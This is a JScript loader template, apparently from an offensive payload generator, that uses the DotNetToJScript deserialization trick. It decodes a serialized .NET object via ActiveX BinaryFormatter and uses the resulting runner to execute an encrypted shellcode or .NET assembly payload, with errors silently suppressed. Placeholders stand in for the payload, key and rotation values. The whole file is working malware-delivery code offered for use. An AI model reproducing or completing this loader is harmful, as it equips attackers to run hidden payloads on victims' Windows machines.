// JscriptGen: Deserialization Logic (DotNetToJScript style)
// Placeholder for the serialized C# Bridge (base64)
var serialized_obj = "#SERIALIZED_OBJ#";
var encrypted_payload = "#ENCRYPTED_PAYLOAD#";
var key = #KEY#;
var rot = #ROT#;
var is_assembly = #IS_ASSEMBLY#;

function Base64ToBytes(b64) {
    var xml = new ActiveXObject("MSXML2.DOMDocument");
    var element = xml.createElement("Base64Data");
    element.dataType = "bin.base64";
    element.text = b64;
    return element.nodeTypedValue;
}

function Deserialize() {
    var fmt = new ActiveXObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter");
    var ms = new ActiveXObject("System.IO.MemoryStream");
    var bytes = Base64ToBytes(serialized_obj);
    ms.Write(bytes, 0, bytes.length);
    ms.Position = 0;
    
    // In JScript, we trigger the deserialization of the object.
    // The format of the serialized stream should include the Runner class.
    // This is the classic DotNetToJScript deserialization trick.
    var runner = fmt.Deserialize_2(ms);
    
    var payload_bytes = Base64ToBytes(encrypted_payload);
    
    if (is_assembly) {
        runner.ExecuteAssembly(payload_bytes, key, rot, []);
    } else {
        runner.ExecuteShellcode(payload_bytes, key, rot);
    }
}

try {
    Deserialize();
} catch (e) {
    // Silent fail or debug:
    // WScript.Echo(e.message);
}
